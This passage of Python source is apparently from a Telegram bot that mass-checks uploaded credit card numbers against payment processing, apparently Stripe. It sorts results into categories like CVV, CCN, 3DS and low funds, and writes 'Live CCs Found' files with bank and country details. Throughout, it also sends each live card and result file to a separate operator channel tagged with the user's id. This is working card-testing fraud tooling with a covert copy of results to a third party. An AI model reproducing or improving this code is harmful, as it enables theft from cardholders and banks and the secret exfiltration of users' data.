                                        "country": country,
                                        "proxy": proxy_state,
                                        "checked_at": checked_at_text,
                                        "duration": elapsed,
                                    })
                                    save_live_cc_to_json(chat_id, worker_id, {
                                        "cc": card,
                                        "status": top_status,
                                        "scheme": scheme,
                                        "type": ctype,
                                        "brand": brand,
                                        "bank": bank,
                                        "country": country,
                                        "proxy": proxy_state,
                                        "checked_at": checked_at_text,
                                        "duration": elapsed,
                                    })

                                    if idx % 5000 == 0:
                                        cleanup_user_json(chat_id)

                                    outfile.write(detail_msg + "\n")
                                    outfile.flush()

                                if is_stop_requested(chat_id):
                                    raise StopMassCheckException()

                                try:
                                    queue_live_notification(
                                        bot,
                                        chat_id,
                                        detail_msg,
                                        parse_mode="HTML",
                                        disable_web_page_preview=True,
                                    )
                                except Exception as e:
                                    logger.warning(f"[LIVE RESULT ERROR] Failed to queue user message: {e}")

                                try:
                                    queue_live_notification(
                                        bot,
                                        CHANNEL_ID,
                                        detail_msg,
                                        parse_mode="HTML",
                                        disable_web_page_preview=True,
                                    )
                                except Exception as e:
                                    logger.warning(f"[CHANNEL LIVE SEND ERROR] {e}")

                            except Exception as e:
                                logger.warning(f"[LIVE RESULT ERROR] {e}")
                        # -----------------------------------------
                        # 🔁 UPDATE PROGRESS BOARD
                        # -----------------------------------------
                        msg_lower = message_text.lower()
                        short_reason = message_text
                        if any(x in msg_lower for x in ["card number is incorrect", "your card is incorrect", "incorrect number"]):
                            short_reason = "Your card number is incorrect"
                        elif any(x in msg_lower for x in ["does not support", "unsupported"]):
                            short_reason = "Your card does not support this type of purchase"
                        elif any(x in msg_lower for x in ["requires_action", "3ds", "authentication required"]):
                            short_reason = "3DS"
                        elif any(x in msg_lower for x in ["insufficient", "low balance"]):
                            short_reason = "Insufficient funds"
                        elif any(x in msg_lower for x in ["security code", "cvc", "cvv"]):
                            short_reason = "You card Security is incorrect"
                        elif any(x in msg_lower for x in ["expired", "expiration"]):
                            short_reason = "Card expired"
                        elif "stripe" in msg_lower:
                            short_reason = "Stripe Token Error"
                        elif "site" in msg_lower:
                            short_reason = "Site Response Failed"

                        is_declined_status = top_status.strip().upper().startswith("DECLINED")
                        board_update_payload = None

                        with progress_lock:
                            counters["total_processed"] += 1
                            counters[count_as] += 1

                            processed = counters["total_processed"]
                            total_cards = counters["total_cards"]
                            cvv = counters["cvv"]
                            ccn = counters["ccn"]
                            threed = counters["threed"]
                            low = counters["low"]
                            declined = counters["declined"]

                            now_ts = time.time()

                            milestone_candidate = milestone_state["processed"]
                            if processed == total_cards or total_cards < 5:
                                milestone_candidate = processed
                            elif processed >= 5 and processed % 5 == 0:
                                milestone_candidate = processed

                            if milestone_candidate != milestone_state["processed"] and processed == milestone_candidate:
                                milestone_state["processed"] = milestone_candidate
                                milestone_state["card"] = card

                            if processed == total_cards:
                                milestone_state["processed"] = processed
                                milestone_state["card"] = card

                            display_processed = milestone_state["processed"]
                            if display_processed == 0:
                                if processed == total_cards or total_cards < 5:
                                    display_processed = processed

                            display_card = milestone_state["card"] if milestone_state["card"] else card

                            declined_since_last = declined - last_board_update["declined_checkpoint"]

                            should_update_board = False
                            if processed == total_cards and last_board_update["processed_display"] != processed:
                                should_update_board = True
                            elif display_processed > last_board_update["processed_display"]:
                                should_update_board = True
                            elif not is_declined_status:
                                if now_ts - last_board_update["last_non_decline_ts"] >= 1.0:
                                    should_update_board = True
                            elif declined_since_last >= DECLINED_UPDATE_GAP:
                                should_update_board = True

                            if should_update_board:
                                last_board_update.update({
                                    "processed": processed,
                                    "status": top_status,
                                    "reason": short_reason,
                                    "declined": declined,
                                    "processed_display": display_processed,
                                    "declined_checkpoint": declined,
                                })
                                if not is_declined_status:
                                    last_board_update["last_non_decline_ts"] = now_ts
                                board_update_payload = {
                                    "card": display_card,
                                    "processed_display": display_processed,
                                    "total_cards": total_cards,
                                    "status": top_status,
                                    "reason": short_reason,
                                    "cvv": cvv,
                                    "ccn": ccn,
                                    "threed": threed,
                                    "low": low,
                                    "declined": declined,
                                }

                        if board_update_payload:
                            checking = not is_stop_requested(chat_id)
                            status_text = f"Processing {board_update_payload['processed_display']}/{board_update_payload['total_cards']} cards..."
                            kb = build_status_keyboard(
                                board_update_payload["card"],
                                board_update_payload["total_cards"],
                                board_update_payload["processed_display"],
                                board_update_payload["status"],
                                board_update_payload["cvv"],
                                board_update_payload["ccn"],
                                board_update_payload["threed"],
                                board_update_payload["low"],
                                board_update_payload["declined"],
                                checking,
                                chat_id,
                                reason=board_update_payload["reason"],
                            )

                            try:
                                bot.edit_message_text(
                                    chat_id=reply_msg.chat.id,
                                    message_id=reply_msg.message_id,
                                    text=status_text,
                                    reply_markup=kb,
                                )
                            except Exception as e:
                                if "message is not modified" not in str(e).lower():
                                    logger.info(f"[PROGRESS BOARD ERROR] {e}")

                        # -----------------------------------------
                        # 🕒 Lightweight cooldown every 20 cards (maintains responsiveness)
                        # -----------------------------------------
                        if idx % 20 == 0 and not is_stop_requested(chat_id):
                            if sleep_with_stop(chat_id, 0.15):
                                raise StopMassCheckException()

                        # Micro pause per card to keep stop checks snappy
                        if sleep_with_stop(chat_id, 0.05):
                            raise StopMassCheckException()

                    # end try (per future)
                    except CancelledError:
                        continue
                    except StopMassCheckException:
                        logger.info(f"[MassCheck] Stop requested for {chat_id}")
                        break
                    except Exception as e:
                        logger.error(f"[RESULT LOOP ERROR] {e}")
            finally:
                # ✅ Ensure all futures are canceled if a stop or error occurs
                try:
                    if is_stop_requested(chat_id):
                        logger.warning(f"[FINALLY] Stop detected mid-run for {chat_id} — canceling remaining futures.")
                        with user_futures_lock:
                            if chat_id in user_futures:
                                for fut in user_futures[chat_id]:
                                    if not fut.done() and not fut.cancelled():
                                        fut.cancel()
                        # attempt executor shutdown without waiting
                        executor.shutdown(wait=False, cancel_futures=True)
                    else:
                        # normal cleanup — wait for executor tasks to finish cleanly
                        executor.shutdown(wait=True, cancel_futures=False)
                except Exception as e:
                    logger.error(f"[FINALLY ERROR] Executor cleanup failed: {e}")

            # ============================================================
            # 🧹 AFTER PROCESSING — CLEANUP AND SUMMARY
            # ============================================================
            with user_futures_lock:
                user_futures.pop(chat_id, None)

            # ============================================================
            # 🛑 STOP HANDLING
            # ============================================================
            if is_stop_requested(chat_id):
                live_count = len(live_cc_results)
                total = counters["total_processed"]
                cancel_pending_futures()

                if live_count > 0:
                    wait_for_live_queue_flush(live_count, targets=(chat_id, CHANNEL_ID))


                summary = (
                    f"🛑 <b>Mass Check Stopped</b>\n\n"
                    f"<b>Processed:</b> {total}/{counters['total_cards']}\n"
                    f"<b>CVV:</b> {counters['cvv']}\n"
                    f"<b>CCN:</b> {counters['ccn']}\n"
                    f"<b>3DS:</b> {counters['threed']}\n"
                    f"<b>LOW FUNDS:</b> {counters['low']}\n"
                    f"<b>DECLINED:</b> {counters['declined']}\n"
                )

                try:
                    bot.send_message(chat_id, summary, parse_mode="HTML")
                except Exception as e:
                    logger.warning(f"[STOP SUMMARY ERROR] {e}")

                # Send partial lives
                if live_count > 0:
                    output_file = f"live_ccs_{chat_id}_results.txt"
                    with open(output_file, "w", encoding="utf-8") as f:
                        for e in live_cc_results:
                            f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")
                    try:
                        with open(output_file, "rb") as f:
                            caption = f"🛑 {live_count} Live CCs Found (Stopped Early)"
                            bot.send_document(chat_id, f, caption=caption)
                            try:
                                f.seek(0)
                                bot.send_document(CHANNEL_ID, f, caption=f"🛑 {live_count} Live CCs Found (Stopped Early, User {chat_id})")
                            except Exception as e:
                                logger.warning(f"[CHANNEL STOP SEND ERROR] {e}")
                                                        
                    except Exception as e:
                        logger.warning(f"[STOP SEND DOC ERROR] {e}")

                    # 🕐 Wait before deleting raw result files
                    logger.info(f"[STOP CLEANUP] Waiting 5s before deleting raw files for {chat_id}")
                    sleep_with_stop(chat_id, 1.0)

                    try:
                        cleanup_all_raw_files(chat_id)
                        logger.info(f"[STOP CLEANUP] Deleted raw files for {chat_id}")
                    except Exception as e:
                        logger.warning(f"[STOP CLEANUP ERROR] {e}")

                    try:
                        os.remove(output_file)
                    except Exception:
                        pass

                # ✅ Unpin and delete progress board on stop
                try:
                    bot.unpin_chat_message(chat_id, reply_msg.message_id)
                except Exception:
                    pass  # Message might already be unpinned or deleted
                try:
                    bot.delete_message(reply_msg.chat.id, reply_msg.message_id)
                except Exception:
                    pass

                # ✅ Non-blocking STOP cleanup
                try:
                    # Release user lock and busy flag *immediately* so interface unfreezes
                    if lock.locked():
                        lock.release()
                    clear_user_busy(chat_id)

                    # Clear stop event so the user can restart right away
                    clear_stop_event(chat_id)

                    logger.info(f"[STOP] User {chat_id} requested stop — releasing resources early.")

                    # 🚀 Run cleanup tasks asynchronously so STOP doesn’t freeze the main thread
                    threading.Thread(target=cleanup_user_file, args=(chat_id,), daemon=True).start()
                    threading.Thread(target=cleanup_user_json, args=(chat_id,), daemon=True).start()
                    threading.Thread(target=cleanup_all_raw_files, args=(chat_id,), daemon=True).start()

                except Exception as e:
                    logger.error(f"[STOP CLEANUP ERROR] {e}")


                return


            # ============================================================
            # ✅ NORMAL COMPLETION SUMMARY
            # ============================================================
            live_count = len(live_cc_results)
            total = counters["total_processed"]

            summary = (
                f"✅ <b>Mass Check Completed</b>\n"
                f"<b>Total Processed:</b> {total}/{counters['total_cards']}\n"
                f"<b>CVV:</b> {counters['cvv']}\n"
                f"<b>CCN:</b> {counters['ccn']}\n"
                f"<b>3DS:</b> {counters['threed']}\n"
                f"<b>LOW FUNDS:</b> {counters['low']}\n"
                f"<b>DECLINED:</b> {counters['declined']}\n"
            )

            # ✅ Unpin and delete progress board on completion
            try:
                bot.unpin_chat_message(chat_id, reply_msg.message_id)
            except Exception:
                pass  # Message might already be unpinned or deleted
            try:
                bot.delete_message(reply_msg.chat.id, reply_msg.message_id)
            except Exception:
                pass

            cleanup_user_file(chat_id)
            cleanup_all_raw_files(chat_id)


            # Send results file
            if live_count > 0:
                wait_for_live_queue_flush(live_count, targets=(chat_id, CHANNEL_ID))
                try:
                    bot.send_message(chat_id, summary, parse_mode="HTML")
                except Exception:
                    pass

                output_file = f"live_ccs_{chat_id}_results.txt"
                with open(output_file, "w", encoding="utf-8") as f:
                    for e in live_cc_results:
                        f.write(f"{e['cc']}|{e.get('bank', '-')}|{e.get('country', '-')} ({e['status']})\n")

                if os.path.exists(output_file):
                    try:
                        with open(output_file, "rb") as f:
                            caption = f"✅ {live_count} Live CCs Found"
                            bot.send_document(chat_id, f, caption=caption)
                            try:
                                f.seek(0)
                                bot.send_document(CHANNEL_ID, f, caption=f"🛑 {live_count} Live CCs Found (User {chat_id})")
                            except Exception as e:
                                logger.warning(f"[CHANNEL STOP SEND ERROR] {e}")
                                                        
                    except Exception:
                        pass
                    try:
                        os.remove(output_file)
                    except Exception:
                        pass
            else:
                try:
                    bot.send_message(chat_id, f"{summary}\nNo live CCs found.", parse_mode="HTML")
                except Exception:
                    pass

        # ============================================================
        # 🧹 FINAL CLEANUP (Handles both stop & normal completion)
        # ============================================================
        try:
            # ⏳ Wait briefly to ensure all threads and file handles are fully released
            sleep_with_stop(chat_id, 1.5)

            # 🔒 Explicitly close all file handles to avoid Windows "in use" error
            for obj in globals().values():
                if hasattr(obj, "close") and callable(obj.close):
                    try:
                        obj.close()
                    except Exception:
                        pass

            # 🧼 Delete uploaded input file first
            cleanup_user_file(chat_id)

            # 🧹 Delay raw result cleanup to ensure outfile handle fully closed
            sleep_with_stop(chat_id, 0.5)
            cleanup_all_raw_files(chat_id)
            clear_user_busy(chat_id)

            if lock.locked():
                lock.release()

            logger.info(f"[SESSION END] Lock released & cleanup fully finished for {chat_id}")

        except Exception as e:
            logger.error(f"[FINAL CLEANUP ERROR] {e}")

        # Schedule delayed recheck cleanup in 5s (ensures deletion after background threads)
        clear_user_busy(chat_id)
        threading.Timer(5.0, cleanup_all_raw_files, args=(chat_id,)).start()


def handle_file(bot, message, allowed_users):
    """
    Public entry point that ensures per-user thread tracking before delegating to the
    implementation. This wrapper lets callers start the worker either directly or via
    run_mass_check_thread while keeping concurrency guards consistent.
    """
    chat_id = str(message.chat.id)
    current_thread = threading.current_thread()

    if not _register_active_thread(chat_id, current_thread):
        bot.reply_to(message, "⚠ You already have an active mass check.")
        return

    try:
        _handle_file_impl(bot, message, allowed_users)
    finally:
        _clear_active_thread(chat_id, current_thread)


def merge_livecc_user_files(user_id: str, max_workers: int = 5):
    folder = os.path.join("live-cc", str(user_id))
    merged_file = os.path.join(folder, f"Live_cc_{user_id}_merged.json")
    all_data = []
    for i in range(1, max_workers + 1):
        path = os.path.join(folder, f"Live_cc_{user_id}_{i}.json")
        if os.path.exists(path):
            try:
                with open(path, "r", encoding="utf-8") as f:
                    all_data.extend(json.load(f))
            except Exception as e:
                logger.warning(f"[MERGE ERROR] {path}: {e}")
    with open(merged_file, "w", encoding="utf-8") as f:
        json.dump(all_data, f, indent=2, ensure_ascii=False)
    logger.info(f"[MERGED LIVECC] Saved {len(all_data)} results to {merged_file}")
    return merged_file


